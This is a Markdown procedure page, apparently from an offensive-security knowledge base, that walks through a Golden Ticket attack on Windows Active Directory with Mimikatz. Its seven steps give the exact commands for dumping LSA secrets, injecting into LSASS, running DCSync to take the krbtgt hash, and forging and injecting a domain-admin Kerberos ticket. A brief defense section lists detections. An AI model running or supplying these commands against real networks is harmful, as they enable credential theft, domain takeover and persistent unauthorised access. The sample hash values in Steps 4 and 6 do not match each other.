---
id: c8ad28ee-374e-4ffc-b035-0f74712278f2
name: Golden-Ticket-Attack-with-Mimikatz
type: procedure
verified: true
submitted: false
created_at: '2023-04-06T03:56:04.712798+00:00'
updated_at: '2023-04-10T20:26:19.904634+00:00'
tactics:
  - '[[tactics/Credential Access|TA0006 - Credential Access]]'
  - '[[tactics/Defense Evasion|TA0005 - Defense Evasion]]'
  - '[[tactics/Lateral Movement|TA0008 - Lateral Movement]]'
techniques:
  - >-
    [[techniques/Steal or Forge Kerberos Tickets|T1558 - Steal or Forge Kerberos
    Tickets]]
  - >-
    [[techniques/Use Alternate Authentication Material|T1550 - Use Alternate
    Authentication Material]]
sub_techniques:
  - '[[sub-techniques/Golden Ticket|T1558.001 - Golden Ticket]]'
tags:
  - '[[tags/Active Directory Attacks]]'
  - '[[tags/Kerberos Tickets]]'
  - '[[tags/Pass-the-Ticket Golden Tickets]]'
  - '[[tags/Using Mimikatz]]'
commands:
  - '[[commands/mimikatz-lsadump-lsa-patch]]'
  - '[[commands/mimikatz-lsadump-lsa-inject-krbtgt]]'
  - '[[commands/mimikatz-lsadump-trust-patch]]'
  - '[[commands/mimikatz-lsadump-dcsync-krbtgt]]'
  - '[[commands/mimikatz-kerberos-purge]]'
  - '[[commands/mimikatz-kerberos-golden]]'
  - '[[commands/mimikatz-kerberos-tgt]]'
platforms:
  - Windows
tools:
  - '[[tools/Mimikatz]]'
validated: true
---

# Golden-Ticket-Attack-with-Mimikatz

## Summary

This procedure demonstrates how to perform a Golden Ticket attack using Mimikatz to extract the krbtgt account hash from an Active Directory domain and forge a persistent Kerberos ticket, granting domain administrator-level access without valid credentials.

## Description

A Golden Ticket attack exploits the Kerberos authentication protocol in Windows Active Directory environments by forging a Ticket Granting Ticket (TGT) using the NTLM hash of the krbtgt account, which is used by the Key Distribution Center (KDC) to sign all Kerberos tickets in the domain. Once the hash is obtained via DCSync or memory dumping, Mimikatz can create a fake TGT for any user, allowing impersonation of domain admins for lateral movement, privilege escalation, and persistence. This technique is highly effective post-compromise of a domain controller or high-privilege account, bypassing normal authentication checks. It targets Windows Server domains with Kerberos enabled and requires local administrator access on a domain-joined machine or DC.

## Requirements

1. Local administrator privileges on a domain-joined Windows machine or Domain Controller.
2. Mimikatz tool installed and executable (run as administrator).
3. Domain credentials with replication rights (e.g., Domain Admin) for DCSync, or LSASS access for memory dumping.
4. Knowledge of the target domain SID and krbtgt hash.

## Defense

- Enable Protected Users group and restrict krbtgt account usage.
- Monitor for DCSync replication requests via Event ID 4662 in Directory Service logs.
- Implement LSA protection (Credential Guard) to prevent LSASS dumping.
- Regularly rotate the krbtgt password and monitor for anomalous Kerberos ticket requests (Event ID 4769 with unusual lifetimes).

## Objectives

1. Extract the NTLM hash of the krbtgt account.
2. Forge a Golden Ticket for a fake or existing user with domain admin privileges.
3. Inject the ticket for persistent domain access and lateral movement.

## Instructions

### Step 1: Patch LSA for Hash Extraction

**Context**: Apply patches to the Local Security Authority (LSA) to enable extraction of sensitive credential data from memory, preparing for krbtgt account interrogation.

**Command** ([[commands/mimikatz-lsadump-lsa-patch]]):
```cmd
lsadump::lsa /patch
```

> This command modifies LSA protection in memory to allow dumping. Run Mimikatz as administrator first with `privilege::debug` if needed.

### Step 2: Inject and Extract krbtgt Account Info

**Context**: Inject into the LSASS process and retrieve details about the krbtgt account, which is essential for hash extraction.

**Command** ([[commands/mimikatz-lsadump-lsa-inject-krbtgt]]):
```cmd
lsadump::lsa /inject /name:krbtgt
```

> Targets the krbtgt user context in LSASS. If access is denied, ensure elevated privileges.

### Step 3: Patch Trust Relationships

**Context**: Patch the trust module to access inter-domain trust information, which may be needed for cross-domain golden tickets.

**Command** ([[commands/mimikatz-lsadump-trust-patch]]):
```cmd
lsadump::trust /patch
```

> Enables dumping of trust keys; skip if single-domain environment.

### Step 4: Perform DCSync to Retrieve krbtgt Hash

**Context**: Mimic a domain controller replication to pull the NTLM hash of the krbtgt account without direct DC access.

**Command** ([[commands/mimikatz-lsadump-dcsync-krbtgt]]):
```cmd
lsadump::dcsync /user:krbtgt
```

> Outputs the hash in format like "krbtgt : aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0" (NTLM hash is the last part). Note this hash for the golden ticket command.

### Step 5: Purge Existing Kerberos Tickets

**Context**: Clear any current Kerberos tickets from the session to avoid conflicts when injecting the new golden ticket.

**Command** ([[commands/mimikatz-kerberos-purge]]):
```cmd
kerberos::purge
```

> Removes all cached tickets; verify with `kerberos::list` showing empty.

### Step 6: Forge the Golden Ticket

**Context**: Use the extracted krbtgt hash to create a forged TGT for a specified user, granting indefinite domain access.

**Command** ([[commands/mimikatz-kerberos-golden]]):
```cmd
kerberos::golden /user:evil /domain:pentestlab.local /sid:S-1-5-21-3737340914-2019594255-2413685307 /krbtgt:d125e4f69c851529045ec95ca80fa37e /ticket:evil.tck /ptt
```

> Replace placeholders: /user (fake admin user), /domain (target domain), /sid (domain SID, get via `whoami /user`), /krbtgt (NTLM hash from Step 4), /ptt (pass-the-ticket injects directly). Saves ticket to file and injects it.

### Step 7: Verify Ticket Injection

**Context**: Generate and list the TGT to confirm the golden ticket is active and usable for authentication.

**Command** ([[commands/mimikatz-kerberos-tgt]]):
```cmd
kerberos::tgt
```

> Requests a TGT using the injected ticket; success allows access to domain resources as the forged user.
